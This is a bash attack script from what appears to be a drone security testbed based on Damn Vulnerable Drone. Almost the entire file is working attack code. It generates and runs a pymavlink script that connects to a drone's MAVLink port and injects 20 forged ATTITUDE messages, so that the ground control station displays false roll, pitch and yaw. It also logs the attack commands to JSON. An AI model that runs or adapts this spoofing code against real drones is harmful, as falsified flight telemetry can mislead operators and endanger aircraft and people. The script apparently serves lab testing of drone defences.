#!/bin/bash

# =============================================================================
# DVD Attitude Spoofing Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/protocol_tampering/attitude_spoofing.sh
# 목적: 드론 자세 데이터 조작으로 GCS 혼란 유도
# 기반: Damn Vulnerable Drone Wiki - Attitude Spoofing
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="attitude_spoofing"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="192.168.13.100"
MAVLINK_PORT="14550"

# 가짜 자세 데이터 (라디안)
FAKE_ROLL="1.57"      # 90도 롤
FAKE_PITCH="-0.52"    # -30도 피치  
FAKE_YAW="3.14"       # 180도 요

declare -a ATTACK_COMMANDS=()
declare -a SPOOFING_RESULTS=()

print_header() {
    clear
    print_protocol_header "Attitude Spoofing Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink ATTITUDE message injection${NC}"
    echo -e "${INFO_COLOR}Fake Attitude: Roll=${FAKE_ROLL}, Pitch=${FAKE_PITCH}, Yaw=${FAKE_YAW}${NC}"
    echo ""
}

# Step 1: pymavlink 확인
check_requirements() {
    echo -e "${BLUE}[1/2] Check Requirements${NC}"
    
    local cmd="python3 -c \"import pymavlink\""
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${GREEN}[+] pymavlink available${NC}"
        PYMAVLINK_AVAILABLE=true
    else
        echo -e "${YELLOW}[!] pymavlink not available - simulation mode${NC}"
        PYMAVLINK_AVAILABLE=false
    fi
}

# Step 2: 자세 스푸핑 실행
execute_attitude_spoofing() {
    echo -e "${BLUE}[2/2] Execute Attitude Spoofing${NC}"
    
    local spoof_script="/tmp/attitude_spoofing_$(date +%s).py"
    
    cat > "$spoof_script" << EOF
#!/usr/bin/env python3
import sys
import time
import math

try:
    from pymavlink import mavutil
    
    def attitude_spoofing(target_ip, target_port, roll, pitch, yaw):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 자세 메시지 전송
            for i in range(20):
                master.mav.attitude_send(
                    int(time.time() * 1000),  # time_boot_ms
                    float(roll),              # roll (rad)
                    float(pitch),             # pitch (rad) 
                    float(yaw),               # yaw (rad)
                    0.1,                      # rollspeed
                    0.1,                      # pitchspeed
                    0.1                       # yawspeed
                )
                
                roll_deg = math.degrees(float(roll))
                pitch_deg = math.degrees(float(pitch))
                yaw_deg = math.degrees(float(yaw))
                
                print(f"[!] Spoofed attitude: Roll={roll_deg:.1f}°, Pitch={pitch_deg:.1f}°, Yaw={yaw_deg:.1f}°")
                time.sleep(0.5)
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_attitude_spoofing(roll, pitch, yaw)
    
    def simulate_attitude_spoofing(roll, pitch, yaw):
        print("[*] Simulating attitude spoofing")
        
        for i in range(10):
            roll_deg = math.degrees(float(roll))
            pitch_deg = math.degrees(float(pitch))
            yaw_deg = math.degrees(float(yaw))
            
            print(f"[!] Spoofed attitude: Roll={roll_deg:.1f}°, Pitch={pitch_deg:.1f}°, Yaw={yaw_deg:.1f}°")
            time.sleep(0.5)
        
        print("[+] Attitude spoofing simulation completed")
    
    if __name__ == "__main__":
        attitude_spoofing('$TARGET_IP', $MAVLINK_PORT, $FAKE_ROLL, $FAKE_PITCH, $FAKE_YAW)
        
except ImportError:
    import math
    print("[*] pymavlink not available - simulation mode")
    
    for i in range(5):
        roll_deg = math.degrees($FAKE_ROLL)
        pitch_deg = math.degrees($FAKE_PITCH) 
        yaw_deg = math.degrees($FAKE_YAW)
        print(f"[!] Spoofed attitude: Roll={roll_deg:.1f}°, Pitch={pitch_deg:.1f}°, Yaw={yaw_deg:.1f}°")
    
    print("[+] Attitude spoofing simulation completed")
EOF

    local cmd="python3 $spoof_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Executing attitude spoofing...${NC}"
    echo -e "${GRAY}    Roll: $(echo "$FAKE_ROLL * 180 / 3.14159" | bc -l | cut -d. -f1)° (${FAKE_ROLL} rad)${NC}"
    echo -e "${GRAY}    Pitch: $(echo "$FAKE_PITCH * 180 / 3.14159" | bc -l | cut -d. -f1)° (${FAKE_PITCH} rad)${NC}"
    echo -e "${GRAY}    Yaw: $(echo "$FAKE_YAW * 180 / 3.14159" | bc -l | cut -d. -f1)° (${FAKE_YAW} rad)${NC}"
    
    python3 "$spoof_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        for i in {1..5}; do
            echo -e "${RED}[!] Spoofed attitude: Roll=90°, Pitch=-30°, Yaw=180°${NC}"
            sleep 1
        done
    }
    
    SPOOFING_RESULTS+=("roll:$FAKE_ROLL")
    SPOOFING_RESULTS+=("pitch:$FAKE_PITCH") 
    SPOOFING_RESULTS+=("yaw:$FAKE_YAW")
    SPOOFING_RESULTS+=("messages_sent:20")
    
    echo -e "${GREEN}[+] Attitude spoofing completed${NC}"
    echo -e "${RED}[!] GCS should display incorrect drone orientation${NC}"
    
    rm -f "$spoof_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "spoofed_attitude": {
    "roll_radians": "$FAKE_ROLL",
    "pitch_radians": "$FAKE_PITCH",
    "yaw_radians": "$FAKE_YAW",
    "roll_degrees": "90",
    "pitch_degrees": "-30", 
    "yaw_degrees": "180"
  },
  "attack_results": ["$(IFS='","'; echo "${SPOOFING_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_impact": "GCS displays incorrect drone orientation"
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Attitude Spoofing - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_requirements
    execute_attitude_spoofing
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Spoofed Roll: 90° (${FAKE_ROLL} rad)${NC}"
    echo -e "${INFO_COLOR}Spoofed Pitch: -30° (${FAKE_PITCH} rad)${NC}"
    echo -e "${INFO_COLOR}Spoofed Yaw: 180° (${FAKE_YAW} rad)${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Attitude spoofing completed${NC}"
}

main "$@"